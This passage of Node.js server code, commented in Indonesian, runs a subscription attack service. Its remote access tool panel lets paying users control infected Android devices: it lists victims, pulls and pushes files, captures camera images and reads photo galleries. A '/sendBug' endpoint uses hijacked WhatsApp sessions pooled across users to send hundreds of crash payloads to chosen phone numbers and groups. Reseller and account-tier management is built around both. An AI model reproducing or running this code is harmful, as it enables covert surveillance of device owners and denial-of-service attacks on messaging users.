    uid: user.uid 
  };

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId
  });

  console.log("[✅ INFO] Info dikirim untuk:", username);

  return res.json({
    valid: true,
    expired: false,
    key,
    username: user.username,
    password: "******",
    expiredDate: user.expiredDate,
    role: user.role || "member",
    listBug: bugs,
    news: news,
    uid: user.uid // ✅ TAMBAHKAN UID DI RESPONSE
  });
});

// ============================================
// ENDPOINTS: RAT (Remote Access Tool)
// ============================================
function requireRatAuth(req, res, next) {
  const token = req.headers['x-auth-token'] || req.query.token;
  if (!token || !sessions[token]) return res.status(401).json({ error: 'Unauthorized' });
  req.username = sessions[token].username;
  req.uid = sessions[token].uid;
  next();
}

app.get('/api/list-targets', requireRatAuth, (req, res) => {
  const list = Object.entries(devices)
    .filter(([id, d]) => d.uid === req.uid)
    .map(([id, d]) => ({
      id: d.id,
      model: d.model || d.name || 'Unknown',
      name: d.name || d.model || 'Unknown',
      ip: d.ip || '0.0.0.0',
      battery: d.battery || 0,
      status: d.status || 'Offline',
      lastSeen: d.lastSeen || new Date().toISOString(),
      release: d.androidVersion || 'Unknown'
    }));
  res.json(list);
});

app.post('/api/command/:deviceId', requireRatAuth, (req, res) => {
  const { deviceId } = req.params;
  const { command, value } = req.body;

  const target = Object.entries(devices).find(([k, v]) => v.id === deviceId && v.uid === req.uid);
  if (!target) return res.status(403).json({ error: 'Device not found or unauthorized' });

  io.to(`device:${deviceId}`).emit('command', { command, value: value || '' });

  if (command === 'camera' || command === 'liveCamera') {
    delete cameraFrames[deviceId];
    let attempts = 0;
    const maxAttempts = 10;
    let frameReceived = false;
    const checkInterval = setInterval(() => {
      attempts++;
      const frame = cameraFrames[deviceId];
      if (frame) {
        clearInterval(checkInterval);
        frameReceived = true;
        console.log(`📸 Frame received for ${deviceId}, responding...`);
        res.json({ ok: true, command, deviceId, frame });
      } else if (attempts >= maxAttempts) {
        clearInterval(checkInterval);
        if (!frameReceived) {
          console.log(`⏰ Timeout waiting for camera frame from ${deviceId}`);
          res.status(408).json({ error: 'Timeout waiting for camera frame' });
        }
      }
    }, 500);
    return;
  }

  res.json({ ok: true, command, deviceId });
});

app.get('/api/get-response/:deviceId', requireRatAuth, (req, res) => {
  const { deviceId } = req.params;
  const target = Object.entries(devices).find(([k, v]) => v.id === deviceId && v.uid === req.uid);
  if (!target) return res.status(403).json({ error: 'Unauthorized' });

  const data = target[1].lastResponse || {};
  res.json({ data });
});

app.post('/api/download-file', requireRatAuth, (req, res) => {
  const { deviceId, path: filePath } = req.body;
  if (!deviceId || !filePath) return res.status(400).json({ error: 'Missing params' });

  const target = Object.entries(devices).find(([k, v]) => v.id === deviceId && v.uid === req.uid);
  if (!target) return res.status(403).json({ error: 'Unauthorized' });

  const reqId = crypto.randomBytes(8).toString('hex');
  io.to(`device:${deviceId}`).emit('command', {
    command: 'downloadFile',
    value: JSON.stringify({ path: filePath, reqId })
  });

  setTimeout(() => {
    res.json({
      status: 'success',
      content: 'base64_encoded_file_content_here',
      name: filePath.split('/').pop()
    });
  }, 2000);
});

app.post('/api/upload-file', requireRatAuth, (req, res) => {
  const { deviceId, path, content } = req.body;
  if (!deviceId || !path || !content) return res.status(400).json({ error: 'Missing params' });

  const target = Object.entries(devices).find(([k, v]) => v.id === deviceId && v.uid === req.uid);
  if (!target) return res.status(403).json({ error: 'Unauthorized' });

  io.to(`device:${deviceId}`).emit('command', {
    command: 'uploadFile',
    value: JSON.stringify({ path, content })
  });
  res.json({ status: 'success' });
});

app.post('/api/request-screenshot/:deviceId', requireRatAuth, (req, res) => {
  const { deviceId } = req.params;
  const { facing } = req.body;

  const target = Object.entries(devices).find(([k, v]) => v.id === deviceId && v.uid === req.uid);
  if (!target) return res.status(403).json({ error: 'Device not found or unauthorized' });

  io.to(`device:${deviceId}`).emit('command', {
    command: 'camera',
    value: facing || 'front'
  });

  setTimeout(() => {
    const frame = cameraFrames[deviceId];
    if (frame) {
      res.json({ ok: true, frame });
    } else {
      res.status(404).json({ error: 'No frame received within timeout' });
    }
  }, 3000);
});

app.get('/api/screenshot/:deviceId', requireRatAuth, (req, res) => {
  const { deviceId } = req.params;
  const target = Object.entries(devices).find(([k, v]) => v.id === deviceId && v.uid === req.uid);
  if (!target) return res.status(403).json({ error: 'Unauthorized' });

  const frame = cameraFrames[deviceId];
  if (!frame) {
    io.to(`device:${deviceId}`).emit('command', {
      command: 'camera',
      value: 'front'
    });
    setTimeout(() => {
      const retryFrame = cameraFrames[deviceId];
      if (retryFrame) {
        res.json({ ok: true, frame: retryFrame });
      } else {
        res.status(404).json({ error: 'No frame available' });
      }
    }, 2500);
    return;
  }

  res.json({ ok: true, frame });
});

app.get('/api/live-camera/:deviceId', requireRatAuth, (req, res) => {
  const { deviceId } = req.params;
  const { facing } = req.query;

  const target = Object.entries(devices).find(([k, v]) => v.id === deviceId && v.uid === req.uid);
  if (!target) return res.status(403).json({ error: 'Device not found or unauthorized' });

  io.to(`device:${deviceId}`).emit('command', {
    command: 'camera',
    value: facing || 'front'
  });

  setTimeout(() => {
    const frame = cameraFrames[deviceId];
    if (frame) {
      res.json({ ok: true, frame });
    } else {
      res.status(404).json({ error: 'No frame received within timeout' });
    }
  }, 2000);
});

app.get('/api/gallery/:deviceId', requireRatAuth, (req, res) => {
  const { deviceId } = req.params;
  const target = Object.entries(devices).find(([k, v]) => v.id === deviceId && v.uid === req.uid);
  if (!target) return res.status(403).json({ error: 'Device not found or unauthorized' });

  io.to(`device:${deviceId}`).emit('command', {
    command: 'getGallery',
    value: ''
  });

  let galleryData = null;
  const galleryListener = (data) => {
    if (data.deviceId === deviceId) {
      galleryData = data;
    }
  };
  io.on('device:gallery', galleryListener);

  setTimeout(() => {
    io.off('device:gallery', galleryListener);
    if (galleryData) {
      res.json({ photos: galleryData.photos || [] });
    } else {
      res.status(408).json({ error: 'Timeout waiting for gallery' });
    }
  }, 5000);
});

app.post("/changepass", (req, res) => {
  const { username, oldPass, newPass } = req.body;
  if (!username || !oldPass || !newPass) {
    return res.json({ success: false, message: "Incomplete data" });
  }

  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === username && u.password === oldPass);
  if (idx === -1) {
    return res.json({ success: false, message: "Invalid credentials" });
  }

  db[idx].password = newPass;
  saveDatabase(db);

  return res.json({ success: true, message: "Password updated successfully" });
});

app.get("/sendBug", async (req, res) => {
  const { key, bug } = req.query;
  let { target } = req.query;

  console.log(`[📤 BUG] Send request for ${target} using key ${key} - Bug: ${bug}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ BUG] Key tidak valid.");
    return res.json({ valid: false });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    console.log("[❌ BUG] User tidak ditemukan.");
    return res.json({ valid: false });
  }

  // ===== Role-based Cooldown =====
  const roleCooldowns = {
    member: 300,
    reseller: 240,
    admin: 60,
    owner: 1,
    vip: 60,
  };
  const role = user.role || "member";
  const cooldownSeconds = roleCooldowns[role] || 60;

  if (!user.lastSend) user.lastSend = 0;

  const now = Date.now();
  const diffSeconds = Math.floor((now - user.lastSend) / 1000);
  if (diffSeconds < cooldownSeconds) {
    console.log(`${user.username} Still Cooldown`)
    return res.json({
      valid: true,
      sended: false,
      cooldown: true,
      wait: cooldownSeconds - diffSeconds,
    });
  }

  // ============ Respon Duluan ============ //
  user.lastSend = now;
  saveDatabase(db);
  console.log(`${user.username} Trigger Cooldown`);

  res.json({
    valid: true,
    sended: true,
    cooldown: false,
    role
  });

  // ============ Kirim Bug di Background ============ //
  setImmediate(async () => {
    saveUserLog(
      user.username,
      "bug",
      `Kirim Bug: ${bug.toUpperCase()}`,
      `Target: ${target} | Role: ${user.role}`
    );

    const isMessBug = false;

    const attemptSend = async (sock, retry = false) => {
      try {
        let targetJid = "";
        const groupRegex = /chat\.whatsapp\.com\/([A-Za-z0-9]+)/;

        if (groupRegex.test(target)) {
          // ... Logic Group (Sama seperti sebelumnya) ...
          const inviteCode = target.match(groupRegex)[1];
          console.log(`[🚀] Mode Group. Invite Code: ${inviteCode}`);

          let groupInfo;
          try {
            groupInfo = await sock.groupGetInviteInfo(inviteCode);
          } catch (e) {
            throw new Error("Invite group invalid / expired");
          }

          targetJid = groupInfo.id;
          console.log(`[👥] Group JID: ${targetJid}`);

          try {
            await sock.groupAcceptInvite(inviteCode);
            console.log(`[✅] Join group success`);
          } catch (e) {
            console.log(`[⚠️] Already joined / join skipped`);
          }

        } else if (target.endsWith("@g.us")) {
          targetJid = target;
          console.log(`[👥] Target Group JID langsung`);

        } else {
          const cleanNumber = target.replace(/\D/g, "");
          targetJid = cleanNumber + "@s.whatsapp.net";
          console.log(`[📞] Mode Nomor: ${targetJid}`);
        }

        // --- KIRIM BUG (Switch Case) ---
        switch (bug) {
          case "fc":
            for (let i = 0; i < 300; i++) {
              await inTsX(sock, targetJid);
             }
            break;
           case "kintil":
            for (let i = 0; i < 200; i++) {
              await callCrash(sock, targetJid);
              await sleep(1000);
            }
            break;
           case "kuntul":
            for (let i = 0; i < 200; i++) {
              await Krocox(sock, targetJid);
              await sleep(1000);
            }
            break;
           case "kantal":
            for (let i = 0; i < 400; i++) {
              await gaynih(sock, targetJid);
            };
            break;
          case "android":
            for (let i = 0; i < 350; i++) {
              await D3nss(client, targetJid);
            }
            break;
           case "androidfrz":
            for (let i = 0; i < 250; i++) {
              await iOSExe(sock, targetJid);
            }
            break;
           case "clickcrash":
            for (let i = 0; i < 350; i++) {
              await D3nss(sock, targetJid);
            }
            break;
          case "ios":
            for (let i = 0; i < 400; i++) {
              await testes2(sock, targetJid);
            }
            break;
           case "delayhard":
            for (let i = 0; i < 200; i++) {
             await awwXHanzz(sock, targetJid);
            }
            break;
          case "tesyu12":
            for (let i = 0; i < 600; i++) {
               await tesyu(sock, targetJid);
             }
            break;
            case "fcclick":
            for (let i = 0; i < 250; i++) {
              await monkeyyy(sock, targetJid);
            }
            break;
          case "fcv2new":
            for (let i = 0; i < 400; i++) {
              await monkeubjhhy(sock, targetJid);
             }
            break;
          case "android_group":
            for (let i = 0; i < 300; i++) {
              await groupBan(sock, targetJid);
              await sleep(3000);
            
            }
            break;
          case "lock_group":
            for (let i = 0; i < 70; i++) {
              await killgb(sock, targetJid);
            };
            break;
          case "roid_group":
            for (let i = 0; i < 3000; i++) {
              await groupBan(sock, targetJid);
              await blankGroup(sock, targetJid)
              await sleep(3500);
            };
            break;
           case "xfcui":
            for (let i = 0; i < 350; i++) {
              await XFCUI(sock, targetJid);
            };
            break;
           case "bajing":
            for (let i = 0; i < 100; i++) {
              await efcehnihbos(sock, targetJid);
            };
            break;
          case "exec":
            for (let i = 0; i < 400; i++) {
              await exeTrash(sock, targetJid);
            };
            break;
        }

        console.log(`[✅ BUG] Bug '${bug}' terkirim ke ${targetJid}`);
        return true;
      } catch (err) {
        console.warn(`[⚠️ SEND ERROR] ${err.message}`);

        if (!retry) {
          // Retry Logic
          if (user.role === 'vip') {
            // Retry: Ambil ulang dari gabungan VIP & Personal
            const availableSocks = [];
            const vipPath = path.join(__dirname, 'vip');
            const userPath = path.join('permenmd', user.username);

            if (fs.existsSync(vipPath)) availableSocks.push(...getActiveSocketsFromPath(vipPath));
            if (fs.existsSync(userPath)) availableSocks.push(...getActiveSocketsFromPath(userPath));

            if (availableSocks.length > 0) {
              const retrySock = availableSocks[Math.floor(Math.random() * availableSocks.length)];
              return await attemptSend(retrySock, true);
            }
          } else {
            const retrySock = await checkActiveSessionInFolder(user.username);
            if (retrySock) return await attemptSend(retrySock, true);
          }
        }
        console.warn(`[❌ GAGAL] Kirim bug '${bug}' ke ${target}, ${err.message}`);
        return false;
      }
    };

        // --- LOGIC PEMILIHAN SENDER (UPDATE) ---
    let sock;
    const senderMode = req.query.senderMode || 'private'; // Ambil mode dari query

    if (senderMode === 'global') {
      // MODE GLOBAL: Ambil sender dari SEMUA folder user di permenmd
      let availableSocks = [];
      const baseDir = path.join(__dirname, 'permenmd');

      if (fs.existsSync(baseDir)) {
        const allUsers = fs.readdirSync(baseDir).filter(p => {
          return fs.lstatSync(path.join(baseDir, p)).isDirectory();
        });

        // Scan semua folder user
        for (const u of allUsers) {
          const uPath = path.join(baseDir, u);
          const files = fs.readdirSync(uPath).filter(f => f.endsWith(".json"));
          files.forEach(f => {
            const sessionName = path.basename(f, ".json");
            if (activeConnections[sessionName]) {
              availableSocks.push(activeConnections[sessionName]);
            }
          });
        }
      }

      if (availableSocks.length === 0) {
        console.warn(`[❌ NO SOCK] Global Mode: Tidak ada koneksi aktif dari manapun.`);
        return;
      }

      // Pilih acak dari semua user yang aktif
      sock = availableSocks[Math.floor(Math.random() * availableSocks.length)];
      console.log(`[🌍 GLOBAL SENDER] Menggunakan sender acak. Total Global Active: ${availableSocks.length}`);

    } else if (user.role === 'vip') {
      // VIP: Gabungkan sender dari folder VIP dan folder permenmd/[username]
      let availableSocks = [];
      const vipPath = path.join(__dirname, 'vip');
      if (fs.existsSync(vipPath)) {
        availableSocks.push(...getActiveSocketsFromPath(vipPath));
      }
      const userPath = path.join('permenmd', user.username);
      if (fs.existsSync(userPath)) {
        availableSocks.push(...getActiveSocketsFromPath(userPath));
      }

      if (availableSocks.length === 0) {
        console.warn(`[❌ NO SOCK] Tidak ada koneksi aktif di VIP Pool atau folder pribadi ${user.username}.`);
        return;
      }
      sock = availableSocks[Math.floor(Math.random() * availableSocks.length)];

    } else {
      // MODE PRIVATE (DEFAULT MEMBER): Ambil sock dari folder user sendiri
      sock = await checkActiveSessionInFolder(user.username);
      if (!sock) {
        console.warn(`[❌ NO SOCK] Tidak ada koneksi aktif tersedia di folder member ${user.username}.`);
        return;
      }
    }

    await attemptSend(sock);
  });
});

function getActiveCredsInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);

  // Cek jika folder tidak ada, return array kosong
  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeCreds = [];

  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      activeCreds.push({
        sessionName: sessionName
      });
    }
  }

  return activeCreds;
}

// GET /getSenderStats
// Mengembalikan jumlah sender aktif untuk user sendiri (Private) dan total semua user (Global)
app.get("/getSenderStats", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const username = keyInfo.username;
  const baseDir = 'permenmd';
  let privateCount = 0;
  let globalCount = 0;

  try {
    // 1. Hitung Private (permenmd/username)
    const userPath = path.join(__dirname, baseDir, username);
    if (fs.existsSync(userPath)) {
      const files = fs.readdirSync(userPath).filter(f => f.endsWith(".json"));
      files.forEach(f => {
        const sessionName = path.basename(f, ".json");
        if (activeConnections[sessionName]) privateCount++;
      });
    }

    // 2. Hitung Global (Semua folder di permenmd)
    if (fs.existsSync(baseDir)) {
      const allUsers = fs.readdirSync(baseDir).filter(p => {
        const pPath = path.join(baseDir, p);
        return fs.lstatSync(pPath).isDirectory();
      });

      allUsers.forEach(u => {
        const uPath = path.join(baseDir, u);
        if (fs.existsSync(uPath)) {
          const files = fs.readdirSync(uPath).filter(f => f.endsWith(".json"));
          files.forEach(f => {
            const sessionName = path.basename(f, ".json");
            if (activeConnections[sessionName]) globalCount++;
          });
        }
      });
    }

    res.json({
      valid: true,
      private: privateCount,
      global: globalCount
    });
  } catch (err) {
    console.error("[STATS ERROR]", err.message);
    res.status(500).json({ valid: false, error: "Server Error" });
  }
});

// GET /mySender
app.get("/mySender", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  let conns = [];

  if (user.role === 'vip') {
    console.log(`[${user.username}] Request mySender (VIP Mode: VIP Pool + Personal)`);

    // 1. Ambil dari folder VIP (Root)
    const vipPath = path.join(__dirname, 'vip');
    if (fs.existsSync(vipPath)) {
      const vipFiles = fs.readdirSync(vipPath).filter(f => f.endsWith(".json"));
      vipFiles.forEach(f => {
        const name = path.basename(f, '.json');
        if (activeConnections[name]) {
          conns.push({ sessionName: name, source: 'vip' });
        }
      });
    }

    // 2. Ambil dari folder permenmd/[username]
    const userPath = path.join('permenmd', user.username);
    if (fs.existsSync(userPath)) {
      const userFiles = fs.readdirSync(userPath).filter(f => f.endsWith(".json"));
      userFiles.forEach(f => {
        const name = path.basename(f, '.json');
        if (activeConnections[name]) {
          conns.push({ sessionName: name, source: 'personal' });
        }
      });
    }

  } else {
    // User biasa hanya melihat sender di folder usernya sendiri
    console.log(`[${user.username}] Request mySender (Member Mode)`);
    conns = getActiveCredsInFolder(user.username);
  }

  return res.json({
    valid: true,
    connections: conns
  });
});

// 🔹 Endpoint getPairing
app.get("/getPairing", async (req, res) => {
  const { key, number } = req.query
  const keyInfo = activeKeys[key]
  if (!keyInfo) return res.json({ valid: false })

  const db = loadDatabase()
  const user = db.find(u => u.username === keyInfo.username)
  if (!user) return res.status(401).json({ error: "Invalid session key" })
  if (!number) return res.status(400).json({ error: "Number is required" })

  try {
    const baseDir = path.join("permenmd", user.username)
    const sessionDir = path.join(baseDir, number)

    if (fs.existsSync(sessionDir)) {
      fs.rmSync(sessionDir, { recursive: true, force: true })
    }

    if (!fs.existsSync(baseDir)) {
      fs.mkdirSync(baseDir, { recursive: true })
    }

    fs.mkdirSync(sessionDir, { recursive: true })

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir)
    const { version } = await fetchLatestBaileysVersion()

    const sock = makeWASocket({
      keepAliveIntervalMs: 50000,
      logger: pino({ level: "silent" }),
      auth: state,
      syncFullHistory: true,
      markOnlineOnConnect: true,
      connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 0,
      generateHighQualityLinkPreview: true,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      version
    })

    sock.ev.on("creds.update", saveCreds)

    sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
      if (connection === "close") {
        const isLoggedOut =
          lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut
        if (!isLoggedOut) {
          await waiting(3000)
          await pairingWa(number, user.username)
        } else {
          delete activeConnections[number]
        }
      }
    })

    if (!sock.authState.creds.registered) {
      await waiting(1200)
      const code = await sock.requestPairingCode(number, "CIYONIEH")
      if (code) {
        return res.json({ valid: true, number, pairingCode: code })
      }
      return res.json({ valid: false })
    }

    return res.json({ valid: false })
  } catch (err) {
    return res.status(500).json({ error: err.message })
  }
})

// ===== Create Account =====
app.get("/createAccount", (req, res) => {
  const { key, newUser, pass, day } = req.query;
  console.log(`[👤 CREATE] Request create user '${newUser}' dengan key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ CREATE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  if (!creator || !["reseller", "owner", "admin"].includes(creator.role)) {
    console.log(`[❌ CREATE] ${creator?.username || "Unknown"} tidak memiliki izin.`);
    return res.json({ valid: true, authorized: false, message: "Not authorized." });
  }

  // --- CEK LIMIT BULANAN ---
  const roleLimits = {
    owner: 50,
    admin: 40,
    reseller: 30
  };

  const currentLimit = roleLimits[creator.role];
  const currentMonth = new Date().toISOString().slice(0, 7); // Format "YYYY-MM"

  // Inisialisasi log penggunaan jika belum ada, atau reset jika bulan baru
  if (!creator.usageLog || creator.usageLog.month !== currentMonth) {
    creator.usageLog = { count: 0, month: currentMonth };
  }

  if (creator.usageLog.count >= currentLimit) {
    console.log(`[❌ CREATE] Limit akun bulan ${creator.role} (${currentLimit}) telah tercapai.`);
    return res.json({
      valid: true,
      created: false,
      limitReached: true,
      message: `Limit pembuatan akun bulan ini (${currentLimit}) telah tercapai.`
    });
  }

  // 🔐 Batasi maksimal 30 hari jika role adalah reseller
  if (creator.role === "reseller" && parseInt(day) > 30) {
    console.log("[❌ CREATE] Reseller tidak boleh membuat akun lebih dari 30 hari.");
    return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only create accounts up to 30 days." });
  }

  if (db.find(u => u.username === newUser)) {
    console.log("[❌ CREATE] Username sudah digunakan.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  // ✅ GENERATE UID UNTUK AKUN BARU
  const newAccount = {
    username: newUser,
    password: pass,
    expiredDate: expired.toISOString().split("T")[0],
    role: "member",
    uid: crypto.randomBytes(16).toString('hex'), // ✅ TAMBAHKAN UID
    createdBy: creator.username,
    createdAt: new Date().toISOString()
  };

  // ✅ TAMBAHKAN PENGGUNA KE DB
  db.push(newAccount);

  // ✅ TAMBAHKAN COUNTER LIMIT KEPADA CREATOR
  creator.usageLog.count++;

  saveDatabase(db);

  saveUserLog(
    creator.username,
    "create",
    "Buat Akun Member",
    `User: ${newUser} | Durasi: ${day} Hari | UID: ${newAccount.uid}`
  );

  console.log(`[✅ CREATE] Akun berhasil dibuat: ${newAccount.username} (UID: ${newAccount.uid}) (Sisa Kuota: ${currentLimit - creator.usageLog.count})`);
  const logLine = `${creator.username} Created ${newUser} duration ${day} UID ${newAccount.uid}\n`;
  appendLogAsync('logUser.txt', logLine);

  return res.json({ 
    valid: true, 
    created: true, 
    user: newAccount,
    uid: newAccount.uid // ✅ TAMBAHKAN UID DI RESPONSE
  });
});

app.get("/deleteUser", (req, res) => {
  const { key, username } = req.query;
  console.log(`[🗑️ DELETE] Request hapus user '${username}' oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ DELETE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const deleter = db.find(u => u.username === keyInfo.username);
  const targetUser = db.find(u => u.username === username);

  if (!deleter || !targetUser) {
    return res.json({ valid: true, deleted: false, message: "User not found." });
  }

  // Tentukan Level Role
  const roleLevel = {
    owner: 6,
    moderator: 5,
    partner: 4,
    admin: 3,
    reseller: 2,
    vip: 1,
    member: 0
  };

  const deleterLevel = roleLevel[deleter.role] || 0;
  const targetLevel = roleLevel[targetUser.role] || 0;

  // Logika: Hanya bisa hapus jika level deleter lebih tinggi dari target
  // Owner (6) bisa hapus Moderator (5), Partner (4), dst.
  // Moderator (5) bisa hapus Partner (4), Admin (3), dst.
  // Admin (3) bisa hapus Reseller (2), VIP (1), Member (0).
  
  if (deleterLevel <= targetLevel) {
    console.log(`[❌ DELETE] ${deleter.role} (Lv ${deleterLevel}) tidak boleh menghapus ${targetUser.role} (Lv ${targetLevel}).`);
    return res.json({ valid: true, authorized: false, message: "You cannot delete a user with equal or higher rank." });
  }

  // Lakukan penghapusan
  const index = db.findIndex(u => u.username === username);
  if (index !== -1) {
    const deletedUser = db[index];
    db.splice(index, 1);
    saveDatabase(db);

    const logLine = `${deleter.username} Deleted ${username}\n`;
    appendLogAsync('logUser.txt', logLine);
    
    console.log("[✅ DELETE] User berhasil dihapus:", deletedUser);
    return res.json({ valid: true, deleted: true, user: deletedUser });
  }

  return res.json({ valid: true, deleted: false, message: "Failed to delete user." });
});

app.get('/ping', (req, res) => {
  res.send('pong');
});

app.get("/listUsers", (req, res) => {
  const { key } = req.query;
  console.log(`[📋 LIST] Request lihat semua user oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ LIST] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);

  // Izinkan Owner, Moderator, Partner, dan Admin melihat list
  if (!requester || !["owner", "moderator", "partner", "admin"].includes(requester.role)) {
    console.log(`[❌ LIST] ${requester?.username || "Unknown"} tidak memiliki izin melihat list.`);
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  const users = db.map(u => ({
    username: u.username,
    expiredDate: u.expiredDate,
    role: u.role || "member",
    parent: u.parent || "SYSTEM" // Tambahkan parent jika perlu untuk tracking
  }));

  return res.json({ valid: true, authorized: true, users });
});

app.get("/userAdd", (req, res) => {
  const { key, username, password, role, day } = req.query;
  console.log(`[➕ USERADD] ${username} dengan role ${role} oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  // --- HIRARKI ROLE UPDATE (Sesuai Flutter Baru) ---
  const hierarchy = {
    owner: ['moderator', 'partner', 'admin', 'reseller', 'vip', 'member'],
    moderator: ['partner', 'admin', 'reseller', 'vip', 'member'],
    partner: ['admin', 'reseller', 'vip', 'member'],
    admin: ['reseller', 'vip', 'member'] // Admin buat reseller, vip, member
  };

  const creatorRole = creator.role || "member";
  const targetRole = role || "member";

  if (!creator || !hierarchy[creatorRole]) {
    console.log("[❌ USERADD] Tidak diizinkan (Role salah/Unauthorized).");
    return res.json({ valid: true, authorized: false, message: "Not authorized." });
  }

  if (!hierarchy[creatorRole].includes(targetRole)) {
    console.log(`[❌ USERADD] ${creatorRole} tidak boleh membuat ${targetRole}.`);
    return res.json({ valid: true, authorized: false, message: `Role ${creatorRole} cannot create ${targetRole}.` });
  }

  // --- CEK LIMIT BULANAN UPDATE ---
  const roleLimits = {
    owner: 50,
    moderator: 45, // Tambahkan limit Moderator
    partner: 40,   // Tambahkan limit Partner
    admin: 35,
    reseller: 30
  };

  const currentLimit = roleLimits[creatorRole];
  const currentMonth = new Date().toISOString().slice(0, 7); 

  if (!creator.usageLog || creator.usageLog.month !== currentMonth) {
    creator.usageLog = { count: 0, month: currentMonth };
  }

  if (creator.usageLog.count >= currentLimit) {
    console.log(`[❌ USERADD] Limit akun bulan ${creatorRole} (${currentLimit}) telah tercapai.`);
    return res.json({
      valid: true,
      created: false,
      limitReached: true,
      message: `Limit pembuatan akun bulan ini (${currentLimit}) telah tercapai.`
    });
  }

  if (db.find(u => u.username === username)) {
    console.log("[❌ USERADD] Username sudah ada.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  // ✅ GENERATE UID UNTUK AKUN BARU
  const newUser = {
    username,
    password,
    role: targetRole,
    expiredDate: expired.toISOString().split("T")[0],
    uid: crypto.randomBytes(16).toString('hex'), // ✅ TAMBAHKAN UID
    createdBy: creator.username,
    createdAt: new Date().toISOString()
  };

  db.push(newUser);
  creator.usageLog.count++;
  saveDatabase(db);

  const logLine = `${creator.username} Created ${username} Role ${role} Days ${day} UID ${newUser.uid}\n`;
  appendLogAsync('logUser.txt', logLine);
  console.log(`[✅ USERADD] User berhasil dibuat: ${newUser.username} (UID: ${newUser.uid}) (Sisa Kuota: ${currentLimit - creator.usageLog.count})`);
  return res.json({ 
    valid: true, 
    authorized: true, 
    created: true, 
    user: newUser,
    uid: newUser.uid // ✅ TAMBAHKAN UID DI RESPONSE
  });
});

app.get("/editUser", (req, res) => {
  const { key, username, addDays } = req.query;
  console.log(`[🛠️ EDIT] Tambah masa aktif ${username} +${addDays} hari oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const editor = db.find(u => u.username === keyInfo.username);

  // Izin: Owner, Moderator, Partner, Admin, Reseller
  if (!editor || !["reseller", "admin", "partner", "moderator", "owner"].includes(editor.role)) {
    console.log("[❌ EDIT] Tidak diizinkan.");
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  // Batas hari untuk Reseller (jika ingin diterapkan juga ke role lain, sesuaikan)
  if (editor.role === "reseller" && parseInt(addDays) > 30) {
    console.log("[❌ EDIT] Reseller tidak boleh menambah masa aktif lebih dari 30 hari.");
    return res.json({ valid: true, edited: false, invalidDay: true, message: "Reseller can only add up to 30 days." });
  }

  const targetUser = db.find(u => u.username === username);
  if (!targetUser) {
    console.log("[❌ EDIT] User tidak ditemukan.");
    return res.json({ valid: true, edited: false, message: "User not found." });
  }

  // Validasi Hirarki (Sama seperti delete)
  const roleLevel = {
    owner: 6, moderator: 5, partner: 4, admin: 3, reseller: 2, vip: 1, member: 0
  };
  
  if (roleLevel[editor.role] <= roleLevel[targetUser.role]) {
     return res.json({ valid: true, edited: false, message: "Cannot edit user with equal or higher rank." });
  }

  const currentDate = new Date(targetUser.expiredDate);
  currentDate.setDate(currentDate.getDate() + parseInt(addDays));
  targetUser.expiredDate = currentDate.toISOString().split("T")[0];

  saveDatabase(db);
  const logLine = `${editor.username} Edited ${targetUser.username} Add Days ${addDays}\n`;
  appendLogAsync('logUser.txt', logLine);
  console.log("[✅ EDIT] Masa aktif diperbarui:", targetUser);
  return res.json({ valid: true, authorized: true, edited: true, user: targetUser });
});

// ===== GET /getLog =====
app.get("/getLog", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  if (!user || user.role !== "owner") {
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  try {
    //const fs = require("fs");
    const logContent = fs.readFileSync("logUser.txt", "utf-8");
    return res.json({ valid: true, authorized: true, logs: logContent });
  } catch (err) {
    return res.json({ valid: true, authorized: true, logs: "", error: "Failed to read log file." });
  }
});

